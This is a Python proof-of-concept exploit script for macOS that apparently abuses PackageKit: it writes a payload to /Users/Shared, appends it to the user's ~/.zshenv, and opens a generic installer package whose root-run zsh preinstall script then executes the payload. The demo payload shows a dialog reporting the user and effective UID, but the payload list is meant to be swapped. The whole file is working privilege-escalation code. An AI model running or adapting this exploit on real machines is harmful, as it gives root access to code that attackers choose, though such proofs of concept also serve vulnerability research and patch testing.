"""
exploit.py: Trigger PackageKit Exploit by creating a malicious '~/.zshenv' file
"""

import tempfile
import subprocess
from pathlib import Path

try:
    import macos_pkg_builder
except ImportError:
    print("[-] Failed to import 'macos_pkg_builder' module")
    print("[-] Please install the 'macos_pkg_builder' module")
    print("[-] 'pip3 install macos-pkg-builder'")
    exit(1)

# Path to the ZSH environment file
ZSH_ENV_FILE = Path.home() / ".zshenv"

class Exploit:
    def __init__(self, payload: list[str]):
        self.payload = payload
        self.payload_path = Path("/Users/Shared/payload.sh")
        self.pkg_path = None

    def _build_generic_pkg(self):
        """
        Build a generic PKG with ZSH preinstall script.
        """
        # Create a temporary preinstall script
        preinstall_script = tempfile.NamedTemporaryFile(delete=False)
        preinstall_script.write(b"#!/bin/zsh\necho 'hello world'\n")
        preinstall_script.close()

        # Create a temporary output file for the package
        pkg_out = tempfile.NamedTemporaryFile(delete=False)

        # Build the package using macos_pkg_builder
        assert macos_pkg_builder.Packages(
            pkg_output=pkg_out.name,
            pkg_preinstall_script=preinstall_script.name,
            pkg_bundle_id="com.malware.pkg",
        ).build() is True, "Failed to build PKG"

        # Rename the package file with a .pkg extension
        self.pkg_path = Path(pkg_out.name)
        self.pkg_path.rename(self.pkg_path.with_suffix(".pkg"))
        self.pkg_path = self.pkg_path.with_suffix(".pkg")

    def _create_payload(self):
        """
        Create payload file and make it executable.
        """
        with open(self.payload_path, "w") as f:
            f.write("\n".join(self.payload))
        subprocess.run(["/bin/chmod", "+x", self.payload_path])

    def _edit_zshenv(self):
        """
        Append payload path to '~/.zshenv' file.
        """
        with open(ZSH_ENV_FILE, "a") as f:
            f.write(f"\n{self.payload_path}\n")

    def _open_pkg(self):
        """
        Open the pkg file.
        """
        subprocess.run(["/usr/bin/open", self.pkg_path, "-a", "Installer"])

    def run(self):
        """
        Run the exploit.
        """
        print("[*] Building generic PKG")
        self._build_generic_pkg()
        print(f"[*] Creating payload at {self.payload_path}")
        self._create_payload()
        print(f"[*] Editing {ZSH_ENV_FILE}")
        self._edit_zshenv()
        print(f"[*] Opening {self.pkg_path.name}")
        self._open_pkg()

if __name__ == "__main__":
    # Define the payload
    payload = [
        "#!/bin/zsh",
        """/usr/bin/osascript -e "display dialog \\"Hello from malware!\n\nCurrent user: $(/usr/bin/whoami)\nUID:  $UID\nEUID: $EUID\\"" """,
    ]
    # Create an instance of the Exploit class with the payload
    exploit = Exploit(payload)
    # Run the exploit
    exploit.run()
